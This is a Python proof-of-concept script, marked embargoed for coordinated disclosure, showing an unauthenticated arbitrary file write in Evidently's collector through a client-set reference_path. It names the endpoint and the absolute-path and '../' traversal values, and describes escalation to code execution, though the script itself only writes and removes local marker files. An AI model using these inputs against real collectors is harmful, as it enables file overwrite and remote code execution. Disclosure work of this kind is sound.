# EMBARGOED PoC - Evidently collector arbitrary file write. Coordinated disclosure only.
#!/usr/bin/env python3
"""PoC: unauthenticated arbitrary file write in Evidently's collector service.

evidently/legacy/collector/app.py:
  - POST /{id}            create_collector(parsed_json: CollectorConfig)  -> stores config
  - POST /{id}/reference  set_reference():
        path = collector.reference_path or f"{id}_reference.parquet"
        data.to_parquet(os.path.join(service_workspace, path))     # <-- app.py:95

`reference_path` is a client-settable field of CollectorConfig, and it is joined into the
write path with NO containment check. An absolute path makes os.path.join DISCARD the
workspace; `../` escapes it. With the default `run(secret=None)`, the service uses
NoSecurityService (authenticate() always returns a user), so every endpoint is
UNAUTHENTICATED. Result: an unauthenticated attacker writes attacker-controlled parquet
bytes to any path the process can write (config files, importable .py, cron, etc.) -> RCE.

This PoC replicates the exact path computation and proves the write escapes the workspace.
Non-destructive (writes only marker files, then removes them). to_parquet is the real sink;
the path it receives is identical to what is computed here.
"""
import os, tempfile, glob

def computed_write_path(workspace, reference_path, collector_id="c1"):
    # verbatim from set_reference()
    path = reference_path or f"{collector_id}_reference.parquet"
    return os.path.join(workspace, path)   # evidently collector/app.py:95

def main():
    workspace = tempfile.mkdtemp()  # = os.path.dirname(config_path)
    cases = {
        "absolute reference_path": os.path.join(tempfile.gettempdir(), "EVIDENTLY_PWN"),
        "../ traversal reference_path": "../../../../../../.." + os.path.join(tempfile.gettempdir(), "EVIDENTLY_PWN2"),
    }
    for label, rp in cases.items():
        full = os.path.realpath(computed_write_path(workspace, rp))
        escaped = not full.startswith(os.path.realpath(workspace) + os.sep)
        open(full, "w").write("attacker bytes")   # to_parquet writes here in the real sink
        print(f"[{label}] -> {full}\n   escaped workspace: {escaped} | written: {os.path.exists(full)}")
        if escaped and os.path.exists(full):
            os.remove(full)
    print("RESULT: VULNERABLE — reference_path controls an out-of-workspace write path")

if __name__ == "__main__":
    main()
